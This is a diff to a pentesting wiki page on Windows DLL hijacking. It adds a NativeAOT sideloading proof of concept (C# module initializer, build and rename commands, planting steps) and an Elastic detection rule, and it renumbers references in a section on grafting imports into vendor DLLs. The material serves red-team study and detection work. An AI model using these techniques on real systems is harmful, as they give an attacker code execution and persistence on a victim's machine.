@@ -26,16 +26,16 @@ windows-cpython-build-landmark-sys-path-hijacking.md
 
 ### Post-installation PE import grafting
 
-Classic side-loading leaves the trusted PE unchanged and wins DLL name resolution. **Import grafting** instead modifies a PE already loaded by the trusted program. The attacker adds an import descriptor and associated lookup/IAT entries for an attacker-controlled DLL. When Windows recursively resolves that dependency, it maps the added DLL and runs its initialization code inside the otherwise legitimate process. This is an on-disk PE modification, not the same operation as replacing a live IAT function pointer with a runtime hook.<sup>[[26]](#references)[[27]](#references)</sup>
+Classic side-loading leaves the trusted PE unchanged and wins DLL name resolution. **Import grafting** instead modifies a PE already loaded by the trusted program. The attacker adds an import descriptor and associated lookup/IAT entries for an attacker-controlled DLL. When Windows recursively resolves that dependency, it maps the added DLL and runs its initialization code inside the otherwise legitimate process. This is an on-disk PE modification, not the same operation as replacing a live IAT function pointer with a runtime hook.<sup>[[31]](#references)[[32]](#references)</sup>
 
-The modified PE can be an intermediate vendor DLL rather than the executable launched by the user or Task Scheduler. A reusable chain is:<sup>[[27]](#references)</sup>
+The modified PE can be an intermediate vendor DLL rather than the executable launched by the user or Task Scheduler. A reusable chain is:<sup>[[32]](#references)</sup>
 
 1. Copy the legitimate executable and its dependencies to an attacker-controlled directory.
 2. Patch one dependency's import structures so they reference the malicious DLL, while retaining the dependency's expected exports and normal behavior.
 3. Configure an autorun or scheduled task to start the legitimate executable. The loader maps the altered dependency and then the newly imported DLL. See [Privilege Escalation with Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks) for task enumeration.
 4. Keep expensive work out of `DllMain`; the observed loader created a worker thread and continued the staged decryption there.
 
-This differs from a vendor-side supply-chain compromise when the vendor package is clean and the import modification occurs after installation. Triage every module in the staged directory, not only the host EXE: compare dependency import lists and hashes with a known-good installation, verify signatures, and investigate vendor binaries launched from unexpected writable locations such as `C:\ProgramData`. A scheduled task pointing at a copied crash reporter or updater in such a directory is a particularly useful pivot.<sup>[[27]](#references)</sup>
+This differs from a vendor-side supply-chain compromise when the vendor package is clean and the import modification occurs after installation. Triage every module in the staged directory, not only the host EXE: compare dependency import lists and hashes with a known-good installation, verify signatures, and investigate vendor binaries launched from unexpected writable locations such as `C:\ProgramData`. A scheduled task pointing at a copied crash reporter or updater in such a directory is a particularly useful pivot.<sup>[[32]](#references)</sup>
 
 
 ### AppDomainManager hijacking (`<exe>.config` + attacker assembly)
@@ -528,6 +528,75 @@ BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReser
 
 </details>
 
+### NativeAOT DLL with export-triggered initialization
+
+A self-contained **.NET NativeAOT shared library** can be used as the planted native DLL without implementing an explicit `DllMain`. Export static C# methods with `[UnmanagedCallersOnly(EntryPoint = "...")]`; when the native host calls one of these compiler-generated entry points, NativeAOT initializes the module and a `[ModuleInitializer]` method runs before the exported C# body. The output does not require a separately installed .NET runtime.<sup>[[26]](#references)[[27]](#references)[[28]](#references)[[29]](#references)</sup>
+
+The DLL still needs the **export names and ABI-compatible signatures** that the selected host actually invokes. Minimal stubs may be enough to trigger initialization, but missing exports can prevent loading and an incorrect signature can corrupt the call. Enumerate the host imports and validate the result with `dumpbin /exports payload.dll` before renaming the output to the dependency name expected by the host.<sup>[[26]](#references)[[28]](#references)</sup>
+
+<details>
+<summary>Minimal NativeAOT exported DLL</summary>
+
+```csharp
+using System;
+using System.IO;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+
+internal static class Bootstrap
+{
+    [ModuleInitializer]
+    internal static void Start()
+    {
+        File.WriteAllText(Path.Combine(Path.GetTempPath(), "nativeaot-sideload.txt"),
+                          Environment.ProcessPath ?? "loaded");
+    }
+}
+
+public static class Exports
+{
+    [UnmanagedCallersOnly(EntryPoint = "LoadLibraryShim")]
+    public static nint LoadLibraryShim() => 0;
+}
+```
+
+</details>
+
+Configure the project as a self-contained Windows native shared library:<sup>[[26]](#references)[[27]](#references)</sup>
+
+```xml
+<PropertyGroup>
+  <TargetFramework>net7.0</TargetFramework>
+  <PublishAot>true</PublishAot>
+  <NativeLib>Shared</NativeLib>
+  <SelfContained>true</SelfContained>
+  <RuntimeIdentifier>win-x64</RuntimeIdentifier>
+</PropertyGroup>
+```
+
+```powershell
+dotnet publish .\SideloadPoc.csproj -c Release -r win-x64
+dumpbin /exports .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll
+Copy-Item .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll .\<expected-name>.dll
+```
+
+Place the renamed DLL beside the copied, vulnerable executable and start the host through the code path that calls the compatible export. This initializer approach avoids placing complex work directly in `DllMain`, but the sideload preconditions are unchanged: the loader must resolve the dependency by name, select the application directory, and not satisfy it first through KnownDLLs, an already loaded module, SxS redirection, or restricted `LOAD_LIBRARY_SEARCH_*` flags.<sup>[[26]](#references)[[30]](#references)</sup>
+
+For conventional native templates see [Windows C payloads](../windows-c-payloads.md). A sideloaded first stage may subsequently perform [process hollowing](../../../reversing/common-api-used-in-malware.md#process-hollowing-aka-runpe), but that is a separate injection technique rather than part of DLL resolution.
+
+## Detection: DLL masquerading library loads
+
+Elastic Defend 9.5.0 enriches a library-load event with `dll.Ext.defense_evasions: "DLL Hijack: Masquerading"` when the loaded file is not Microsoft-signed and its filename collides with Elastic's cached inventory of Windows/system DLL names. This moves filename inventory, system-location and signature analysis into the endpoint sensor; the core EQL can therefore be reduced to:<sup>[[26]](#references)</sup>
+
+```text
+library where host.os.type == "windows" and event.action == "load" and
+  dll.Ext.defense_evasions : "DLL Hijack: Masquerading"
+```
+
+Treat the enrichment as a high-value pivot rather than proof by itself. Increase confidence when a signed host loads the DLL from its own **user-writable** directory, the DLL is unsigned/untrusted, and `dll.Ext.relative_file_creation_time` shows that it was created shortly before loading. Scope exclusions to the exact publisher + host process + installation path; do not suppress a colliding DLL name globally because legitimate installers and applications can ship private libraries with system-like names.<sup>[[26]](#references)</sup>
+
+On sensors without that enrichment, approximate the behavior by correlating a colliding DLL name with a non-system load path, absent/untrusted Microsoft signature, and a short file-create-to-load interval. This requires a maintained DLL-name inventory and narrow exclusions for `%SystemRoot%\\System32`, `SysWOW64`, `WinSxS`, and other approved deployment paths.<sup>[[26]](#references)</sup>
+
 ## Case Study: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)
 
 Windows Narrator.exe still probes a predictable, language-specific localization DLL on start that can be hijacked for arbitrary code execution and persistence.<sup>[[7]](#references)</sup>
@@ -781,7 +850,12 @@ Defensive pivots
 - [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
 - [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
 - [25] [Unit 42 – CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
-- [26] [Microsoft Learn – PE format](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
-- [27] [FortiGuard Labs – Uncovering a SectopRAT Variant Embedded in Legitimate Software](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
+- [26] [Elastic Security Labs – Reconstructing and Detecting Windows DLL Search-Order Hijacking with Elastic Defend 9.5.0](https://www.elastic.co/security-labs/threat-command/dll-search-order-hijacking-elastic-defend)
+- [27] [Microsoft Learn – Building native libraries with Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/libraries)
+- [28] [Microsoft Learn – Native exports with Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/interop#native-exports)
+- [29] [Microsoft Learn – ModuleInitializerAttribute](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.compilerservices.moduleinitializerattribute?view=net-7.0)
+- [30] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
+- [31] [Microsoft Learn – PE format](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
+- [32] [FortiGuard Labs – Uncovering a SectopRAT Variant Embedded in Legitimate Software](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
 
 {{#include ../../../banners/hacktricks-training.md}}
